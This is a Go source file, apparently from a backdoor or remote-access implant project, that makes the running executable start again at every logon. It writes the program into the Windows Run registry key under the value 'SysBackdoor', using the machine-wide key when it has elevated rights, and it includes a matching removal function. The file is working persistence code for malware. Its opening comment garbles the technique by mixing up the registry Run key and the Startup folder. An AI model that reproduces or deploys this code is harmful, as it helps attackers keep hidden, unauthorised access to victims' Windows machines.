package windows

import (
	"nombredetuapp/Documents/Proyecto/src/commands/persistence/utils"
	"os"
	"os/exec"
)

// WindowsPersistence provides methods to enable persistence on Windows systems.
// A common technique is to create a registry entry under
// HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run to
// save the binary into %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup to achieve persistence on Windows systems.

func RegPersist() string {
	exePath, err := os.Executable()
	if err != nil {
		return err.Error()
	}
	if utils.IsElevated() {
		// If elevated, write to HKLM instead of HKCU
		exec.Command("reg", "add", `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "SysBackdoor", "/d", exePath, "/f").Run()
		return "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key created for persistence.\n"
	}
	exec.Command("reg",
		"add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v",
		"SysBackdoor",
		"/d",
		exePath,
		"/f").Run()
	return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key created for persistence.\n"
}

func RegPersistRemove() string {
	if utils.IsElevated() {
		// If elevated, remove from HKLM instead of HKCU
		exec.Command("reg", "delete", `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "SysBackdoor", "/f").Run()
		return "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key removed.\n"
	}
	exec.Command("reg",
		"delete",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v",
		"SysBackdoor",
		"/f").Run()
	return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key removed.\n"
}
